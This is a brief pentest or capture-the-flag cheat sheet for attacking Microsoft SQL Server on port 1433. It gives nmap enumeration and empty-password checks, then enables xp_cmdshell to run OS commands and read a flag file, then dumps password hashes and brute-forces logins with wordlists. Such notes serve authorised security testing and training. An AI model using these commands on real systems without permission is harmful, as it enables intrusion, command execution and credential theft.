# Microsoft SQL Server (TCP/1433)

## Nmap

sudo nmap -sV -sC -p1433 <TARGET_IP>
nmap -p1433 --script ms-sql-info <TARGET_IP>
nmap -p1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <TARGET_IP>
nmap -p1433 --script ms-sql-empty-password <TARGET_IP>

Impacket client

python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py '<USER>:<PW>@<HOST>'

# inside SQL:

EXECUTE AS LOGIN = 'sa';          -- if permitted
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;          RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'type C:\flag.txt';
NSE helpers (requires creds)

nmap -p1433 --script ms-sql-query --script-args \
"mssql.username=<USER>,mssql.password=<PW>,ms-sql-query.query='SELECT @@version;'" <TARGET_IP>

nmap -p1433 --script ms-sql-dump-hashes --script-args \
"mssql.username=<USER>,mssql.password=<PW>" <TARGET_IP>
Brute (only if in scope)

nmap -p1433 --script ms-sql-brute --script-args \
userdb=/root/common_users.txt,passdb=/root/100-common-passwords.txt <TARGET_IP>
